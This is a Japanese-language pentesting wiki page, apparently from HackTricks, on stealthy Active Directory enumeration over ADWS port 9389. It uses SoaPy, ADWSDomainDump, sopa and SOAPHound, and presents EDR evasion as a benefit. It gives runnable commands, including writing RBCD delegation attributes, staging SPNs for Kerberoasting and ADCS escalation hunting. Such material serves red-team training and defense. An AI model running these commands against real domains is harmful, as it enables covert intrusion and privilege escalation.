# Active Directory Web Services (ADWS) 列挙とステルス収集

{{#include ../../banners/hacktricks-training.md}}

## ADWSとは？

Active Directory Web Services (ADWS) は **Windows Server 2008 R2 以降のすべての Domain Controller でデフォルトで有効** で、TCP **9389** をリッスンします。名前に反して **HTTP は関与しません**。代わりに、このサービスはプロプライエタリな .NET フレーミングプロトコルのスタックを通じて LDAP 風のデータを公開します:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

これらのバイナリ SOAP フレーム内にトラフィックがカプセル化され、一般的でないポート上を流れるため、**ADWS による列挙は従来の LDAP/389 & 636 トラフィックよりも検査・フィルタ・シグネチャ検出されにくい**です。オペレータにとっての利点は:

* よりステルスな偵察 — Blue teams はしばしば LDAP クエリに注力します。
* **非 Windows ホスト（Linux、macOS）** からでも SOCKS プロキシ経由で 9389/TCP をトンネリングすれば収集可能。
* LDAP で取得できるのと同じデータ（users、groups、ACLs、schema など）と、**書き込み** を行う能力（例: `msDs-AllowedToActOnBehalfOfOtherIdentity` による **RBCD**）を持つ。

ADWS のやり取りは WS-Enumeration 上で実装されています: すべてのクエリは LDAP フィルタ/属性を定義する `Enumerate` メッセージで始まり、EnumerationContext GUID を返し、その後サーバ定義の結果ウィンドウ分をストリーミングする 1 回以上の `Pull` メッセージが続きます。Context は約 30 分で期限切れになるため、ツールは結果をページングするかフィルタを分割（CN ごとのプレフィックスクエリ）して状態を失わないようにする必要があります。セキュリティディスクリプタを要求する場合は、SACL を省略するために `LDAP_SERVER_SD_FLAGS_OID` コントロールを指定してください。さもないと ADWS は SOAP 応答から単に `nTSecurityDescriptor` 属性を削除します。

> NOTE: ADWS は多くの RSAT GUI/PowerShell ツールでも使用されるため、トラフィックが正当な管理アクティビティと混ざる可能性があります。

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy) は **純粋な Python による ADWS プロトコルスタックのフル再実装** です。NBFX/NBFSE/NNS/NMF フレームをバイト単位で組み立てるため、.NET ランタイムに触れずに Unix 系システムから収集できます。

### 主な機能

* **SOCKS 経由のプロキシ** をサポート（C2 インプラントから有用）。
* LDAP の `-q '(objectClass=user)'` と同等の細粒度検索フィルタ。
* オプションの **write** 操作（`--set` / `--delete`）。
* BloodHound に直接取り込める **BOFHound 出力モード**。
* 人間可読性が必要な場合のタイムスタンプ / `userAccountControl` を整形する `--parse` フラグ。

### ターゲット収集フラグと書き込み操作

SoaPy には ADWS 上で一般的な LDAP ハンティング作業を再現するキュレートされたスイッチが同梱されています: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`、およびカスタム取得用の生の `--query` / `--filter` ノブ。これらは `--rbcd <source>`（`msDs-AllowedToActOnBehalfOfOtherIdentity` を設定）、`--spn <service/cn>`（ターゲット Kerberoasting 用の SPN ステージング）、`--asrep`（`userAccountControl` の `DONT_REQ_PREAUTH` を反転）などの書き込みプリミティブと組み合わせて使います。

Example targeted SPN hunt that only returns `samAccountName` and `servicePrincipalName`:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
同じホスト/資格情報を使って発見を即座に武器化できます: `--rbcds` で RBCD-capable オブジェクトをダンプし、次に `--rbcd 'WEBSRV01$' --account 'FILE01$'` を適用して Resource-Based Constrained Delegation チェーンをステージします（完全な悪用経路については [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) を参照）。

### インストール (operator host)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – LDAPDomainDump over ADWS (Linux/Windows)

* LDAP のシグネチャ検出を減らすために、LDAP クエリを TCP/9389 の ADWS 呼び出しに置き換える `ldapdomaindump` のフォーク。
* `--force` が渡されない限り、まず 9389 への到達可能性チェックを行います（ポートスキャンがノイズやフィルタで無効化されている場合はプローブをスキップ）。
* README にて Microsoft Defender for Endpoint と CrowdStrike Falcon に対するテストと成功したバイパスが記載されています。

### インストール
```bash
pipx install .
```
### 使用法
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
典型的な出力は、9389の到達性チェック、ADWS bind、および dump start/finish をログに記録します:
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa - Golangでの実用的なADWSクライアント

Similarly as soapy, [sopa](https://github.com/Macmod/sopa) implements the ADWS protocol stack (MS-NNS + MC-NMF + SOAP) in Golang, exposing command-line flags to issue ADWS calls such as:

* **オブジェクトの検索と取得** - `query` / `get`
* **オブジェクトのライフサイクル** - `create [user|computer|group|ou|container|custom]` and `delete`
* **属性編集** - `attr [add|replace|delete]`
* **アカウント管理** - `set-password` / `change-password`
* その他 `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]` など

## SOAPHound – 大規模ADWS収集（Windows）

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) は、すべてのLDAP相互作用をADWS内に留め、BloodHound v4-compatible JSONを出力する .NET コレクタです。`objectSid`, `objectGUID`, `distinguishedName` および `objectClass` の完全なキャッシュを一度構築（`--buildcache`）し、その後高ボリュームの `--bhdump`, `--certdump`（ADCS）, または `--dnsdump`（AD-integrated DNS）処理で再利用するため、DCから外に出る属性は約35個の重要な属性に限定されます。AutoSplit（`--autosplit --threshold <N>`）は、大規模フォレストで30分の EnumerationContext タイムアウトを超えないよう、CNプレフィックスでクエリを自動的に分割します。

Typical workflow on a domain-joined operator VM:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Exported JSON slots directly into SharpHound/BloodHound workflows—see [BloodHound methodology](bloodhound.md) for downstream graphing ideas. AutoSplit makes SOAPHound resilient on multi-million object forests while keeping the query count lower than ADExplorer-style snapshots.

## Stealth AD 収集ワークフロー

以下のワークフローは、ADWS経由で**ドメイン & ADCS オブジェクト**を列挙し、それらをBloodHound JSONに変換して証明書ベースの攻撃経路を調査する手順を、すべてLinux上で実行する方法を示します:

1. **Tunnel 9389/TCP** をターゲットネットワークから自分のマシンへトンネルする（例：Chisel、Meterpreter、SSHの動的ポートフォワードなど）。 `export HTTPS_PROXY=socks5://127.0.0.1:1080` を設定するか、SoaPyの `--proxyHost/--proxyPort` を使用します。

2. **Collect the root domain object:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **ADCS に関連するオブジェクトを Configuration NC から収集する:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **BloodHound に変換する:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. BloodHound GUI に **ZIP をアップロードし**、`MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` のような cypher queries を実行して、証明書による昇格経路（ESC1、ESC8、など）を明らかにします。

### `msDs-AllowedToActOnBehalfOfOtherIdentity` の書き込み (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
これを `s4u2proxy`/`Rubeus /getticket` と組み合わせることで、完全な **Resource-Based Constrained Delegation** チェーンを構築できます（詳細は [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) を参照）。

## ツール概要

| 目的 | ツール | 備考 |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, read/write |
| High-volume ADWS dump | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS modes |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | SoaPy/ldapsearch のログを変換 |
| Cert compromise | [Certipy](https://github.com/ly4k/Certipy) | 同じ SOCKS を経由してプロキシ可能 |
| ADWS enumeration & object changes | [sopa](https://github.com/Macmod/sopa) | 既知の ADWS エンドポイントとやり取りする汎用クライアント - enumeration、object creation、attribute modifications、password changes を可能にする |

## 参考資料

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
